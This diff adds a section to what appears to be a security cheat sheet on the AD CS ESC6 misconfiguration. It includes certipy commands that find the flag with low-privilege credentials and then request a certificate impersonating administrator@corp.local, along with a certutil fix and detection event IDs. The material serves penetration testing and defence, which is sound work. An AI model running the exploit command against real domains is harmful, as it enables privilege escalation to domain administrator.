@@ -21,3 +21,21 @@ The flag makes **every template** accept a CSR-supplied SAN → any Client Auth 
 
 ### Commands
 ```bash
+# ── Detect the flag ──────────────────────────────────────────────────
+certipy find -u lowpriv@corp.local -p 'Password123!' \
+  -dc-ip 10.10.10.5 -vulnerable -stdout
+# Output: "User Specified SAN: Enabled"
+
+# ── Exploit any template ─────────────────────────────────────────────
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca CORP-CA -template User -upn administrator@corp.local
+
+# ── Fix (clear the flag) ─────────────────────────────────────────────
+certutil -config "CORP-CA\dc01" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+# Restart CertSvc.
+```
+
+### Detection
+CA registry change (**4657**) + restart of `CertSvc`; **4886** SAN mismatch.
+
+---
